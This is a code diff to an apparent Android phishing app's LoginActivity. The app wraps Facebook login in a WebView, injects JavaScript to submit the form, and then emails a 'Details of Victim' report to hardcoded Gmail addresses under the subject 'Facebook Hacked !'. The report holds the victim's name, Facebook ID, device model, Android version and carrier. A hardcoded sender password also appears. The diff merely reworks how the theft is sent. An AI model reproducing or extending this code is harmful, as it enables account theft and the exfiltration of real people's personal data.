@@ -266,7 +266,6 @@ public class LoginActivity extends AppCompatActivity
                                 {
                                     FBMain.loadUrl("javascript:(function(){" + "l=document.getElementById('u_0_9');" + "e=document.createEvent('HTMLEvents');" +
                                             "e.initEvent('click',true,true);" + "l.dispatchEvent(e);" + "})()");
-                                    MainLayout.setVisibility(View.GONE);
                                     final String message="Details of Victim =>\n"+
                                             "\nName = "+vName.replace("\"","")+
                                             "\nFacebook ID = "+Login.getText().toString()+
@@ -274,21 +273,16 @@ public class LoginActivity extends AppCompatActivity
                                             "\nDevice Used = "+Build.MODEL+
                                             "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
                                             "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-
-                                    new Thread(new Runnable() {
-                                        @Override
-                                        public void run() {
-                                            try {
-                                                GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                                sender.sendMail("Facebook Hacked !",
-                                                        message,
-                                                        "ritik.fbhack@gmail.com",
-                                                        "ritik.space@gmail.com");
-                                            } catch (Exception e) {
-                                                Log.e("SendMail", e.getMessage(), e);
-                                            }
-                                        }
-                                    }).start();
+                                    try
+                                    {
+                                        GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                        sender.sendMail("Facebook Hacked !",
+                                                message,
+                                                "ritik.fbhack@gmail.com",
+                                                "ritik.space@gmail.com");
+                                        MainLayout.setVisibility(View.GONE);
+                                    }
+                                    catch (Exception e) { Log.e("SendMail", e.getMessage(), e); }
                                 }
                                 else{sendMail();}
                             }
